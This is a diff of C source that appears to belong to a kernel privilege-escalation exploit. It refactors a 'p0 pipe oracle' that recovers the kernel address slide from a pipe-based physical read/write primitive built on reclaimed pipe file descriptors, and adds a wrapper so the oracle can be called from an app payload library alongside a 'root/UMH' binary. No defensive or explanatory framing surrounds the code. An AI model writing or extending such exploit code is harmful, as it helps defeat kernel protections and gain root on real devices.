@@ -896,7 +896,7 @@ cleanup:
 }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
+static uintptr_t scan_p0_pipe_oracle_core(int fd, uintptr_t base) {
   const struct p0_fingerprint *fps = p0_fingerprints;
   int best_score = 0;
   int second_score = 0;
@@ -935,11 +935,34 @@ static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
   }
   return fps[best_index].slide;
 }
-#endif
+
+/*
+ * scan_p0_pipe_oracle — public no-arg entry point used by slide_app.c.
+ *
+ * APP_PAYLOAD builds compile both pipe.c and slide_app.c into the same
+ * shared library.  slide_app.c calls scan_p0_pipe_oracle() with no
+ * arguments; this wrapper resolves the reclaim fd and base address from
+ * the globals that install_pipe_physrw() already populated, then
+ * delegates to scan_p0_pipe_oracle_core().
+ *
+ * Only emitted for APP_PAYLOAD builds to avoid a symbol conflict with
+ * run_p0_pipe_oracle_diagnostic() in the root/UMH binary.
+ */
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+uintptr_t scan_p0_pipe_oracle(void) {
+  if (pipebuf_pipe_idx < 0 || pipebuf_page_base == 0) {
+    return (uintptr_t)-1;
+  }
+  int fd = pipe_fds_reclaim[pipebuf_pipe_idx][0];
+  return scan_p0_pipe_oracle_core(fd, pipebuf_page_base);
+}
+#endif /* APP_PAYLOAD */
+
+#endif /* APP_PHYS_P0_ORACLE */
 
 /*
  * run_p0_pipe_oracle_diagnostic — diagnostic wrapper around
- * scan_p0_pipe_oracle.  Defined only in non-app (root/UMH) builds
+ * scan_p0_pipe_oracle_core.  Defined only in non-app (root/UMH) builds
  * because slide_app.c provides its own version for -app.so builds,
  * and having both translation units define the symbol causes a
  * duplicate-symbol link error when -DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1
@@ -948,7 +971,7 @@ static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
 #if !(defined(APP_PAYLOAD) && APP_PAYLOAD)
 void run_p0_pipe_oracle_diagnostic(int fd, uintptr_t base) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  uintptr_t slide = scan_p0_pipe_oracle(fd, base);
+  uintptr_t slide = scan_p0_pipe_oracle_core(fd, base);
   pr_info("p0_pipe_oracle diagnostic base=%016zx slide=%016zx\n",
           base, slide);
 #else
